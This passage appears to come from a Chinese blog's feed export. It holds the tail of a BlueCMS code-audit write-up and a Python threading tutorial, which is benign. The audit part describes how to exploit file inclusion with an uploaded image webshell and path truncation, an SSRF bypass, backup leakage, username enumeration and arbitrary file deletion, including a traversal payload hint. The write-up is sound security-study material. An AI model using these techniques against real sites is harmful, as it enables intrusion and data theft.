<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt loading="lazy"></p>
<p>随后在新闻页面成功弹窗</p>
<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="备份信息泄露"><a href="#备份信息泄露" class="headerlink" title="备份信息泄露"></a>备份信息泄露</h4><p>管理员界面可以进行数据库备份，备份完后的数据放在这个目录下，并且命名规则为使用当日日期，可以尝试爆破地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt loading="lazy"></p>
<p>访问即可下载sql文件，其中有用户的个人信息，密码经过了md5加密，弱密码的话直接就可以加密开了</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>既然有文件包含漏洞自然少不了那四个<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">文件包含</a>的操作，所以在找文件包含漏洞的时候就需要对这几个操作格外留意</p>
<h4 id="支付表单文件包含"><a href="#支付表单文件包含" class="headerlink" title="支付表单文件包含"></a>支付表单文件包含</h4><p>先在user.php中找到有<code>include</code>操作的代码，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt loading="lazy"></p>
<p>可以看到这里我们可以post一个pay参数，且pay参数我们可控，既然有文件包含了，自然就要找到文件上传的地方来包含这个文件来达到getshell的目的，在我们修改个人资料的界面就有上传头像的操作，于是我们上传图片马</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt loading="lazy"></p>
<p>得到路径，而这个文件包含操作在后面还加上了一个<code>/index.php</code>，这里就要根据为Windows下的文件最大路径来截取了，前提条件是php版本要小于<code>5.2.8</code>，Windows下目录最大长度为256字节，超出的部分会被丢弃，于是在提交act=pay的表单处提交一个<code>pay=../../data/upload/face_pic/15869440930.jpg......(超出256个字节)</code>，即可达到效果，由于我这没配php5.2.8的版本就不演示了</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="修改用户头像处SSRF"><a href="#修改用户头像处SSRF" class="headerlink" title="修改用户头像处SSRF"></a>修改用户头像处SSRF</h4><p>源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt loading="lazy"></p>
<p>这段代码是用来防止<code>http://</code>和<code>https://</code>链接的，但是使用的是弱比价，如果<code>strpos</code>返回的值为0，那么<code>0!=false</code>返回的是<code>false</code>即可绕过判断访问内网资源</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="install无限安装"><a href="#install无限安装" class="headerlink" title="install无限安装"></a>install无限安装</h4><p>install目录是用来安装这个CMS的，但是在经过一次安装后再进入install系统并不会提示已经安装过或者要身份验证，于是就会造成无需任何提交就可以重新安装这个网站的风险，尽管管理员页面有提示（开发人员也有意识到），但如果使用者并没有在意就会造成极大的危害</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt loading="lazy"></p>
<h4 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h4><p>在输入用户名之后系统会自动发一个包到数据库去验证，如图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt loading="lazy"></p>
<p>而这个查询并没有次数限制，于是就可以利用这个数据包传入的user_name值来爆破用户名，造成身份信息泄露</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt loading="lazy"></p>
<h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在修改会员的个人资料页面存在此漏洞，源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt loading="lazy"></p>
<p><code>face_pic3</code>可控，当<code>face_pic1</code>为空时即可删除<code>face_pic3</code>文件，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt loading="lazy"></p>
<p>可删除网站根目录下的1.txt文件</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></li>
<li><a href="https://www.anquanke.com/post/id/178545">https://www.anquanke.com/post/id/178545</a></li>
<li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-多线程编程</title>
    <url>/posts/64be7bf2/</url>
    <content><![CDATA[<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>可用对象列表</p>
<table>
<thead>
<tr>
<th align="center">对象</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Thread</td>
<td align="center">表示一个执行线程的对象</td>
</tr>
<tr>
<td align="center">Lock</td>
<td align="center">锁原语对象</td>
</tr>
<tr>
<td align="center">RLock</td>
<td align="center">可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)</td>
</tr>
<tr>
<td align="center">Condition</td>
<td align="center">条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值</td>
</tr>
<tr>
<td align="center">Event</td>
<td align="center">条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活</td>
</tr>
<tr>
<td align="center">Semaphore</td>
<td align="center">为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞</td>
</tr>
<tr>
<td align="center">BoundedSemaphore</td>
<td align="center">与Semaphore相似，不过它要在运行前等待一段时间</td>
</tr>
<tr>
<td align="center">Timer</td>
<td align="center">与Thread相似，不过它要在运行前等待一段时间</td>
</tr>
<tr>
<td align="center">Barrier</td>
<td align="center">创建一个”障碍”，必须达到指定数量的线程后才可以继续</td>
</tr>
</tbody></table>
<h3 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h3><p>Thread类是threading模块主要的执行对象</p>
<p><strong>Thread对象数据属性</strong></p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">name</td>
<td align="center">线程名</td>
</tr>
<tr>
<td align="center">ident</td>
<td align="center">线程的标识符</td>
</tr>
<tr>
<td align="center">daemon</td>
<td align="center">布尔标志，表示这个线程是否是守护线程</td>
</tr>
</tbody></table>
<p><strong>Thread对象方法</strong></p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,verbose=None,daemon=None)</code></td>
<td align="center">实例化一个线程对象，需要有一个可调用的target，以及其参数args或kwargs</td>
</tr>
<tr>
<td align="center">start()</td>
<td align="center">开始执行该线程</td>
</tr>
<tr>
<td align="center">run()</td>
<td align="center">定义线程功能的方法(通常在子类中被应用开发者重写)</td>
</tr>
<tr>
<td align="center">join(timeout=None)</td>
<td align="center">直至启动的线程终止之前一直挂起；除非给出了timeout(秒)，否则会一直阻塞</td>
</tr>
</tbody></table>
<p>下面看一段可创建多线程的代码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token punctuation">,</span> ctime
loops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nloop<span class="token punctuation">,</span> nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start loop"</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">"at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"loop"</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">"done at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting at:"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    nloops <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>
        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>loop<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>loops<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#target=需要线程去执行的方法名   args=线程执行方法接收的参数，该属性是一个元组，如果只有一个参数也需要在末尾加逗号</span>
        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#线程等待启动</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 线程等待，主线程不会等待子线程执行完毕再结束自身，可使用Thread类的join()方法来让所有子线程执行完毕以后，主线程再关闭</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at:"</span><span class="token punctuation">,</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>运行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt loading="lazy"></p>
<p>当然以上也可以创建多个线程，下面使用可调用的类来实现：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep

loops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">ThreadFunc</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func
        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#重写run方法,定义线程功能</span>
        self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nloop<span class="token punctuation">,</span> nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'start loop'</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">'at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'loop'</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">'done at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'starting at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    nloops <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>
        t <span class="token operator">=</span> ThreadFunc<span class="token punctuation">(</span>loop<span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> loops<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'all DONE at :'</span><span class="token punctuation">,</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>效果和上面的一样，随后我们将其功能存储为一个独立的模块（myThread.py）：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime

<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>func<span class="token punctuation">,</span>args<span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func
        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args

    <span class="token keyword">def</span> <span class="token function">getResult</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>res  <span class="token comment">#将结果保存后通过getResult方法获取返回值</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>res <span class="token operator">=</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"finished at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="斐波那契，阶乘与累加"><a href="#斐波那契，阶乘与累加" class="headerlink" title="斐波那契，阶乘与累加"></a>斐波那契，阶乘与累加</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> myThread <span class="token keyword">import</span> MyThread
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep

<span class="token keyword">def</span> <span class="token function">Fib</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.005</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>Fib<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> Fib<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Fac</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> Fac<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Sum</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> Sum<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

funcs <span class="token operator">=</span> <span class="token punctuation">[</span>Fib<span class="token punctuation">,</span> Fac<span class="token punctuation">,</span> Sum<span class="token punctuation">]</span>
n <span class="token operator">=</span> <span class="token number">8</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    nfuncs <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>funcs<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting"</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token string">"at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token string">"finished at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n *** MULTIPLE THREADS"</span><span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>
        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>getResult<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>运行结果如下，可见多线程处理的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt loading="lazy"></p>
<h3 id="锁示例"><a href="#锁示例" class="headerlink" title="锁示例"></a>锁示例</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> atexit <span class="token keyword">import</span> register
<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange
<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread <span class="token punctuation">,</span> Lock<span class="token punctuation">,</span> current_thread
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep

<span class="token keyword">class</span> <span class="token class-name">CleanOutputSet</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#当使用print输出对象的时候，若定义了__str__(self)方法，打印对象时就会从这个方法中打印出return的字符串数据</span>
        <span class="token keyword">return</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> self<span class="token punctuation">)</span><span class="token comment">#表示将self中每个元素（除最后一个）后加上, 分离形成字符串后返回</span>

lock <span class="token operator">=</span> Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#创建一个锁对象</span>
loops <span class="token operator">=</span> <span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#此行表示随机选取2-5的数字随机选3-7次</span>
remaining <span class="token operator">=</span> CleanOutputSet<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>
    myname <span class="token operator">=</span> current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name  <span class="token comment">#返回当前Thread对象的名字</span>
    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#加锁</span>
    remaining<span class="token punctuation">.</span>add<span class="token punctuation">(</span>myname<span class="token punctuation">)</span>   <span class="token comment">#add方法，如果不在集合中则添加</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] Started &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>myname<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#print("    (remaining: &#123;&#125;)".format(remaining or "NONE"))</span>
    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#释放</span>
    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>
    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>
    remaining<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>myname<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] Competed &#123;&#125; (&#123;&#125; secs)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>myname<span class="token punctuation">,</span>nsec<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"    (remaining: &#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>remaining <span class="token keyword">or</span> <span class="token string">"NONE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> pause <span class="token keyword">in</span> loops<span class="token punctuation">:</span>
        Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>loop<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pause<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@register</span>   <span class="token comment">#通过装饰器使用register,atexit模块使用register函数用于在 python 解释器中注册一个退出函数，这个函数在解释器正常终止时自动执行</span>
<span class="token keyword">def</span> <span class="token function">_atexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

